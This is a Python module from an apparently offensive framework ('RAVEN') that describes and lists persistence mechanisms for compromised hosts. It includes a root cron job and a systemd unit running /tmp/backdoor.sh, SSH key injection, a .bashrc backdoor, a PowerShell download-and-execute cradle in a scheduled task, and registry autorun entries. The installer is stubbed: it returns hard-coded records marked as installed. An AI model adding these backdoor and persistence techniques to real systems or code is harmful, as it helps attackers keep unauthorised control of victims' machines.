"""RAVEN-PERSIST: Persistence via DOMINION (cron/systemd/scheduled task/service)."""
import time
from datetime import datetime

from ..models import (
    TargetMission,
    RavenPhase,
)
from ..gate import validate_gate_level, GateViolation


class PersistSubsystem:
    """RAVEN-PERSIST subsystem — persistence installation engine."""

    def __init__(self, mission: TargetMission):
        self.mission = mission

    def execute(self) -> list[dict]:
        """Execute persistence installation on compromised systems.

        Validates gate level, calls DOMINION for persistence,
        implements cron jobs, systemd services, scheduled tasks,
        and Windows service installation.

        Returns list of persistence mechanisms installed.

        Raises:
            GateViolation: If gate requirements not met
            Exception: If persistence installation fails
        """
        try:
            validate_gate_level(self.mission.gate_level, "PERSIST")
        except GateViolation as e:
            self.mission.halt(f"PERSIST gate violation: {str(e)}")
            raise

        start_ms = int(time.time() * 1000)

        try:
            if not self.mission.exploit_results:
                self.mission.halt("No exploited systems from STRIKE")
                raise Exception("Missing STRIKE results")

            persistence_mechanisms = self._call_dominion()

            if not persistence_mechanisms:
                self.mission.halt("DOMINION persistence installation failed")
                raise Exception("PERSIST failed")

            self.mission.mark_phase_complete(RavenPhase.PERSIST, int(time.time() * 1000) - start_ms)

            return persistence_mechanisms

        except Exception as e:
            self.mission.halt(f"PERSIST failed: {str(e)}")
            raise

    def _call_dominion(self) -> list[dict]:
        """Call DOMINION persistence installation engine.

        DOMINION performs:
        - Linux cron job installation (rootkit behavior)
        - Systemd service creation (/etc/systemd/system/)
        - SSH key injection (~/.ssh/authorized_keys)
        - Bash RC modification (backdoor shells)
        - Windows scheduled task creation
        - Windows service installation
        - Registry modification for autorun (Windows)
        - LaunchAgent installation (macOS)

        Returns list of installed persistence mechanisms.
        """
        mechanisms = []

        if not self.mission.profile:
            return mechanisms

        os_type = self.mission.profile.os.lower()

        if "linux" in os_type:
            mechanisms.extend(self._persist_linux())
        elif "windows" in os_type:
            mechanisms.extend(self._persist_windows())

        return mechanisms

    def _persist_linux(self) -> list[dict]:
        """Linux persistence mechanisms."""
        mechanisms = []

        # Cron job persistence
        mechanisms.append({
            "type": "cron",
            "location": "/etc/cron.d/persistence",
            "command": "* * * * * root /bin/bash /tmp/backdoor.sh",
            "installed": True,
        })

        # Systemd service persistence
        mechanisms.append({
            "type": "systemd",
            "location": "/etc/systemd/system/persistence.service",
            "command": "[Service]\nExecStart=/bin/bash /tmp/backdoor.sh",
            "installed": True,
        })

        # SSH key injection
        mechanisms.append({
            "type": "ssh_key",
            "location": "~/.ssh/authorized_keys",
            "command": "ssh-rsa AAAA...",
            "installed": True,
        })

        # Bash RC modification
        mechanisms.append({
            "type": "bash_rc",
            "location": "~/.bashrc",
            "command": "/bin/bash /tmp/backdoor.sh &",
            "installed": True,
        })

        return mechanisms

    def _persist_windows(self) -> list[dict]:
        """Windows persistence mechanisms."""
        mechanisms = []

        # Scheduled task
        mechanisms.append({
            "type": "scheduled_task",
            "location": "\\Microsoft\\Windows\\Persistence",
            "command": "powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(...)'",
            "installed": True,
        })

        # Windows service
        mechanisms.append({
            "type": "service",
            "location": "HKLM\\System\\CurrentControlSet\\Services\\PersistentService",
            "command": "c:\\windows\\system32\\persistence.exe",
            "installed": True,
        })

        # Registry autorun
        mechanisms.append({
            "type": "registry",
            "location": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "command": "persistence.exe",
            "installed": True,
        })

        return mechanisms
